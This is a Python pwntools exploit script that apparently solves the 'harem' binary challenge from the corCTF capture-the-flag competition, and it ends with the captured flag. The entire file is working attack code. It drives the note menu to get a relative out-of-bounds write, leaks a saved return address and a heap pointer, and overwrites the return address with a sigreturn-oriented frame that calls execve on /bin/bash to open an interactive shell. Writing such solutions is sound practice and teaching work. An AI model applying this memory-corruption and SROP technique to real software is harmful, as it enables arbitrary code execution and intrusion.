#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./harem")

context.binary = exe
context.terminal = ["tmux", "new-window"]

def conn():
    if args.REMOTE:
        r = remote("be.ax", 32564)
        param = r.recvline().split()[-1]
        print(param)
        poow = subprocess.check_output(["/home/user/.cache/redpwnpow/redpwnpow-v0.1.2-linux-amd64", param])
        print(poow)
        r.sendline(poow)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit-gef.py
b*note_add
b*note_delete
b*note_read
b*main+0x682
b*main+0x9d4
c
        """)

def pause():
    if args.GDB:
        input("pause")
    else:
        time.sleep(2)

def inc_idx():
    global idx
    idx = (idx + 1) & 0xff
    r.sendlineafter(b"\n> ", b"1")

def dec_idx():
    global idx
    idx = (idx - 1) & 0xff
    r.sendlineafter(b"\n> ", b"2")

def add_note(title, content):
    assert len(title) <= 32, f"title too long (+{len(title) - 32})"
    assert len(content) <= 128, f"content too long (+{len(content) - 128})"
    r.sendlineafter(b"\n> ", b"3")
    r.sendlineafter(b"title: ", title)
    r.sendlineafter(b"content: ", content)

def del_note():
    r.sendlineafter(b"\n> ", b"4")

def read_note():
    r.sendlineafter(b"\n> ", b"5")
    assert r.read(7) == b"title: ", "read error"
    title = r.recvuntil(b"\ncontent: ", drop=True)
    content = r.recvuntil(b"\n1) Move note", drop=True)
    return {"title":title, "content":content}

def select_note(i):
    global idx

    if (idx < 0x8 and 0x8 <= i) or i < idx:
        while idx != i: dec_idx()
    else:
        while idx != i: inc_idx()


def rel_write(offset, data):
    global idx
    i = offset // 0xa1
    rem_off = offset % 0xa1

    select_note(i)

    while len(data) > 0:
        note = b""
        if rem_off:
            bak = None
            try:
                bak = read_note()
            except AssertionError:
                add_note(b"", b"")
                bak = read_note()
            note = (bak["title"] + bak["content"])[:rem_off]
            rem_off = 0

        append_size = (32 + 128) - len(note)
        note += data[:append_size]
        data = data[append_size+1:] # skip 1 byte from the field "init"

        add_note(note[:32], note[32:])
        select_note(idx+1)

def main():
    global r, idx

    idx = 0

    r = conn()
    
    select_note(10)
    add_note(b"a", b"b")
    leak = read_note()
    saved_rip = u64(leak["content"][0x16:0x16+8])
    first_note = u64(leak["content"][0xe:0xe+8]) - 0x688
    info(f"saved rip = {hex(saved_rip)}")
    info(f"first note @ {hex(first_note)}")

    select_note(0)
    add_note(p64(first_note + 32), b"/bin/bash\x00")

    syscall = 0x000000000801a444 # syscall; ret
    rt_restore_si = exe.address + 0x1b4ac # sigreturn; ret


    frame = SigreturnFrame(kernel="amd64")
    # frame.rax = 9 # mmap
    # frame.rdi = 0x1337000 # addr
    # frame.rsi = 0x1000 # len
    # frame.rdx = 7 # prot
    # frame.r10 = 0x32 # flags
    # frame.r8 = -0x1 # fd
    # frame.r9 = 0x0 # off
    # frame.rip = syscall
    # frame.rsp = second_stack

    frame.rax = 59 # execve
    frame.rdi = first_note + 32 # filename
    frame.rsi = first_note # argv
    frame.rdx = first_note + 8 # envp
    frame.rip = syscall

    srop = p64(rt_restore_si)
    srop += bytes(frame)
    
    # overwrite saved rip
    rel_write(0xa1*10 + 0x36, srop)

    attach_gdb()

    r.sendlineafter(b"\n> ", b"6")

    r.interactive()


if __name__ == "__main__":
    main()

# corctf{sur3ly_th15_t1m3_17_w1ll_k1ll_c!!}
